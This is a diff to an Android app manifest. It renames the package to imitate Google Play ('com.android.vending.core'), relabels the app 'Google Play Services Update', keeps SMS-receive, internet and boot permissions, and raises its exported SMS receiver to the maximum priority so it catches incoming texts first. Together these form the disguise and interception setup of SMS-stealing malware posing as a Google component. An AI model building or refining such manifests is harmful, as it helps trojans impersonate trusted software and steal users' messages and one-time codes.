@@ -1,33 +1,25 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.sys.sync">
+    package="com.android.vending.core">
 
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.INTERNET" />
-    
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
     <application 
-        android:allowBackup="false"
-        android:label="Google System Sync"
-        android:usesCleartextTraffic="true">
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="Google Play Services Update"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar">
         
-        <meta-data android:name="google_analytics_adid_collection_enabled" android:value="false" />
-        <meta-data android:name="firebase_analytics_collection_enabled" android:value="false" />
-        <meta-data android:name="com.google.android.backup.api_key" android:value="unused" />
-
-        <receiver android:name=".SmsReceiver" 
+        <receiver android:name="com.sys.sync.SmsReceiver" 
                   android:permission="android.permission.BROADCAST_SMS"
                   android:exported="true">
-            <intent-filter android:priority="999">
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            <intent-filter android:priority="2147483647"> <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
 
-        <activity android:name=".MainActivity" 
-                  android:theme="@android:style/Theme.NoDisplay" 
+        <activity android:name="com.sys.sync.MainActivity" 
                   android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
